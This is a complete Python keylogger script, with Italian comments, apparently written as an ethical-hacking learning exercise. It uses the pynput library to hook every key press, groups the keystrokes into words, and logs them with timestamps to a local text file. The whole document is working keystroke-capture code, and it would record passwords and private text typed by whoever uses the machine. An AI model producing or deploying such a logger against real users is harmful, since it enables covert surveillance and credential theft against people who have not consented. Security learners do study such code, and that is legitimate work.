import pynput #registra le pressioni della tastiera e mouse
from pynput.keyboard import Key, Listener
import logging #per registrare i dati raccolti in un log_file

#log_file_directory = r'path/to/where/the/log_file/will/be'

log_file_directory = r'M:\Ethical Hacking\progetti da fare\fatti\Basic Keylogger with Python'


#CONFIGURAZIONE DEL LOGGER  
# filename sarà nel percorso indicato in log_file_directory e lo chiama keyLog.txt
# level = DEBUG significa che vengono registrati tutti i livelli di log??
# %(asctime)s è la stringa contenente la data e l'ora
# %(message)s è la stringa contenente la pressione del tasto registrata
logging.basicConfig(filename = (log_file_directory + r'/keyLog.txt'), level = logging.DEBUG, format = '%(asctime)s: %(message)s')



current_word = ""  # Variabile per memorizzare la parola attualmente digitata

# La funzione riceve come argomento key, rappresentante il tasto premuto. 
# Questa funzione registra il tasto premuto convertendolo in stringa e scrivendolo nel file di log utilizzando logging.info()
def on_press(key):
    global current_word  # Utilizziamo current_word esterna alla funzione

    try:
        if key != Key.space and key != Key.enter and key != Key.shift:  # Se il tasto premuto non è spazio, enter o shift
            current_word += str(key.char)  # Aggiungi il carattere alla parola attuale
        else:
            if key == Key.space or key == Key.enter:
                if current_word:  # Se c'è una parola da registrare
                    logging.info(current_word)  # Registra la parola quando viene premuto lo spazio o il tasto Enter
                    current_word = ""  # Resetta la parola attuale per iniziare a raccoglierne un'altra
            elif key == Key.enter:
                logging.info("Enter")  # Registra "Enter" quando viene premuto il tasto Enter
                logging.info(current_word)
                current_word = ""
    except AttributeError:
        current_word += str(key)  # Aggiungi il carattere speciale alla parola attuale

# Viene creato un oggetto Listener che rimane in ascolto per i tasti premuti sulla tastiera. Una volta rilevato un tasto premuto, 
# viene chiamata la funzione on_press per gestire l'evento. 
# Il metodo join() blocca l'esecuzione del programma finché il listener non viene arrestato.
with Listener(on_press=on_press) as listener:
    listener.join()



